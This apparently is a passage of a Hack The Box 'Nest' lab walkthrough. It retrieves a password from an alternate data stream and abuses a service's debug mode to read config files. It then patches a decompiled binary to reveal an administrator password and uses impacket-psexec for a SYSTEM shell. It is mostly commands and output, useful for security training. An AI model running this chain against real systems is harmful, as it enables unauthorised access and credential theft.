+┌─[user@parrot-virtual]─[~/htb/nest/smb]
+└──╼ $smbclient -U c.smith //10.10.10.178/users
+Enter WORKGROUP\c.smith's password: 
+Try "help" to get a list of possible commands.
+smb: \> allinfo
+smb: \c.smith\HQK Reporting\> allinfo "Debug Mode Password.txt" 
+altname: DEBUGM~1.TXT
+create_time:    Thu Aug  8 16:06:12 2019 PDT
+access_time:    Thu Aug  8 16:06:12 2019 PDT
+write_time:     Thu Aug  8 16:08:17 2019 PDT
+change_time:    Thu Aug  8 16:08:17 2019 PDT
+attributes: A (20)
+stream: [::$DATA], 0 bytes
+stream: [:Password:$DATA], 15 bytes
+=====================================================================================================================================
+
+We can now see that the password file debug did indeed have a password albeit hidden in an alternate data stream.
+Commands and Output:
+=====================================================================================================================================
+smb: \c.smith\HQK Reporting\> get "Debug Mode Password.txt":Password
+getting file \c.smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/nest/smb]
+└──╼ $cat Debug\ Mode\ Password.txt\:Password 
+WBQ201953D8w 
+=====================================================================================================================================
+
+we can now leverage the password to use it in debug mode while connecting to the high port and see what we can do.
+Commands and Output:
+=====================================================================================================================================
+>debug WBQ201953D8w
+
+Debug mode enabled. Use the HELP command to view additional commands that are now available
+>help
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR <Directory_Name>
+RUNQUERY <Query_ID>
+DEBUG <Password>
+HELP <Command>
+SERVICE
+SESSION
+SHOWQUERY <Query_ID>
+=====================================================================================================================================
+
+
+We can even use show query to cat files.
+Commands and Output:
+=====================================================================================================================================
+>service
+
+--- HQK REPORTING SERVER INFO ---
+
+Version: 1.2.0.0
+Server Hostname: HTB-NEST
+Server Process: "C:\Program Files\HQK\HqkSvc.exe"
+Server Running As: Service_HQK
+Initial Query Directory: C:\Program Files\HQK\ALL QUERIES
+>setdir ..
+
+Current directory set to HQK
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  ALL QUERIES
+[DIR]  LDAP
+[DIR]  Logs
+[1]   HqkSvc.exe
+[2]   HqkSvc.InstallState
+[3]   HQK_Config.xml
+
+Current Directory: HQK
+>showquery 1
+
+File over size limit. Are you sure this is a HQK query file?
+>
+
+Unrecognised command
+>showquery 3
+
+<?xml version="1.0"?>
+<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <Port>4386</Port>
+  <DebugPassword>WBQ201953D8w</DebugPassword>
+  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
+</ServiceSettings>
+
+=====================================================================================================================================
+
+Interestingly, we find more files that we may need to further analyze outside the program
+Commands and Output:
+=====================================================================================================================================
+
+Current Directory: HQK
+>setdir ldap
+
+Current directory set to ldap
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[1]   HqkLdap.exe
+[2]   Ldap.conf
+
+Current Directory: ldap
+>showquery Ldap.conf
+Error: Input string was not in a correct format.
+=====================================================================================================================================
+
+We also come across a password hash for administrator while enumerating the ldap cnfig file
+Commands and Output:
+=====================================================================================================================================
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[DIR]  ALL QUERIES
+[DIR]  LDAP
+[DIR]  Logs
+[1]   HqkSvc.exe
+[2]   HqkSvc.InstallState
+[3]   HQK_Config.xml
+
+Current Directory: HQK
+>sedir ldap
+
+Unrecognised command
+>setdir ldap
+
+Current directory set to ldap
+>list
+
+Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+[1]   HqkLdap.exe
+[2]   Ldap.conf
+
+Current Directory: ldap
+>showquery 2
+
+Domain=nest.local
+Port=389
+BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+=====================================================================================================================================
+
+The executable file(HqkLdap.exe) that we just copied to the commando windows computer, we can open with dnspy to decompile and then 
+export to a project and then open the sln file that was created so we can further analyze.
+
+On visual studio we can see on the file cr.cs something is being encrypted and then decrypted.
+Ldap.cs can query ldap to query users.
+MainModule.cs is basically processing most of the data for users including decrypting passwords.
+We set a breakpoint where we think the password will be decrypted within the module.
+
+Given that a lot of compile issues pop up we will instead edit and run using dnspy.
+Commands and Output:
+=====================================================================================================================================
+ldap.Password = ldapSearchSettings.Password;
+=====================================================================================================================================
+
+In dnspy we add the following code to the MainModule.cs file in order to print the decrypted password unto the command prompt.
+
+We also add the following to the executable current directory in order for the executable to work correctly:
+C:\Users\commando\Desktop\nest>echo "" > HqkDbImport.exe
+Commands and Output:
+====================================================================================================================================
+                        ldap.Username = ldapSearchSettings.Username;
+						ldap.Password = ldapSearchSettings.Password;
+						ldap.Domain = ldapSearchSettings.Domain;
+						Console.WriteLine("Performing LDAP query...");
+						Console.WriteLine("The pasword is:");
+						Console.WriteLine(ldap.Password);
+=====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+C:\Users\commando\Desktop\nest>.\HqkLdap.exe Ldap.conf
+Performing LDAP query...
+Unexpected error: The specified domain does not exist or cannot be contacted.
+
+C:\Users\commando\Desktop\nest>.\HqkLdap.exe Ldap.conf
+Performing LDAP query...
+The pasword is:
+XtH4nkS4Pl4y1nGX
+Unexpected error: The specified domain does not exist or cannot be contacted.
+
+====================================================================================================================================
+The creds now being: administrator:XtH4nkS4Pl4y1nGX
+
+We can now use psexec to login as system.
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/nest/smb]
+└──╼ $impacket-psexec administrator@10.10.10.178
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.10.10.178.....
+[*] Found writable share ADMIN$
+[*] Uploading file hkqBfnsm.exe
+[*] Opening SVCManager on 10.10.10.178.....
+[*] Creating service CEbX on 10.10.10.178.....
+[*] Starting service CEbX.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+=====================================================================================================================================
